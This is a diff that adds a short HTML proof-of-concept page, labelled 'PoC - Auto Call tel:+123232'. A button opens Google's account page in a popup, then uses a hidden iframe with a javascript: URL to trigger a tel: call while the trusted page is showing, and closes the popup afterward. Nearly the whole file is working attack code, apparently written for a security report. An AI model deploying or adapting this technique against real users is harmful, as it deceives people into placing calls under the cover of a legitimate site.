@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC - Auto Call tel:+123232</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: Arial, sans-serif;
+            background: #f0f0f0;
+            text-align: center;
+        }
+        button {
+            display: inline-block;
+            padding: 15px 30px;
+            background: #ff4444;
+            color: white;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 50px;
+            border: none;
+        }
+        button:hover { background: #cc0000; }
+        #status {
+            margin-top: 20px;
+            color: #333;
+            font-size: 24px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <h2>Click to Trigger Phone Call</h2>
+    <button id="triggerBtn">Call +123232</button>
+    <div id="status"></div>
+
+    <script>
+        document.getElementById('triggerBtn').onclick = () => {
+            // Step 1: Open legit Google Account page
+            const w = window.open('https://account.google.com/', '_blank');
+            if (!w) {
+                document.getElementById('status').innerHTML = 'Popup blocked!';
+                return;
+            }
+
+            // Step 2: After 2 seconds, trigger tel:+123232
+            setTimeout(() => {
+                const iframe = document.createElement('iframe');
+                iframe.src = 'javascript:(function(){' +
+                    'document.write("<h2 style=\\"font-family:sans-serif;\\">Calling +123232...</h2>");' +
+                    'setTimeout(() => { location.href = "tel:+123232"; }, 500);' +
+                    '})()';
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+
+                // Show status
+                document.getElementById('status').innerHTML = 'Calling tel:+123232...';
+
+                // Cleanup
+                setTimeout(() => {
+                    document.body.removeChild(iframe);
+                    if (w && !w.closed) w.close();
+                }, 3000);
+
+            }, 2000);
+        };
+    </script>
+</body>
+</html>
